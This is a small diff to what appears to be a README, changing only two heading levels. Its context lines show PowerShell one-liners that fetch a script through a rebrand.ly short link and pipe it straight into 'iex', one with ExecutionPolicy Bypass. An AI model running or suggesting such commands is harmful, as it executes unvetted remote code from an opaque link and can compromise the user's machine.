@@ -24,14 +24,14 @@
 ##### or
 
     powershell irm rebrand.ly/pedbox | iex
-#### or
+##### or
 
     cmd.exe /c powershell -command "Set-ExecutionPolicy Bypass -Scope Process -Force; iex(irm rebrand.ly/pedbox)"
 
 ### PowerShell Link 
 
     iex(irm rebrand.ly/pedbox)
-#### or
+##### or
 
     irm rebrand.ly/pedbox | iex
 
